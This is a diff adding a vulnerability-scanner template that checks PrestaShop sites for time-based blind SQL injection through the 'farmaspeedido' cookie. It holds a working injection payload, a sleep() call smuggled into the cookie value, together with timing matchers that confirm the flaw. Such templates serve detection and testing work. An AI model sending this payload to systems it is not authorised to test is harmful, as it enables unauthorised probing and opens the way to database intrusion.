@@ -1,0 +1,51 @@
+id: cookie-farmaspeedido-sqli
+
+info:
+  name: PrestaShop Cookie farmaspeedido - Time-Based Blind SQL Injection
+  author: acunetix-export
+  severity: critical
+  description: |
+    Time-based blind SQL injection via Cookie farmaspeedido.
+    Server application uses cookie values in SQL queries without preparation.
+  reference:
+    - https://owasp.org/www-community/attacks/SQL_Injection
+  classification:
+    cvss-score: 9.8
+    cwe-id: CWE-89
+  metadata:
+    verified: true
+    max-request: 2
+    vector: cookie
+    framework: prestashop
+  tags: sqli,cookie,time-based,blind,farmaspeedido
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Cookie: farmaspeedido=1
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code != 404 && status_code != 403 && status_code != 0 && duration <= 3'
+        internal: true
+
+  - raw:
+      - |
+        @timeout: 20s
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Cookie: farmaspeedido=1'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=6'
+      - type: dsl
+        dsl:
+          - 'status_code != 404 && status_code != 403'
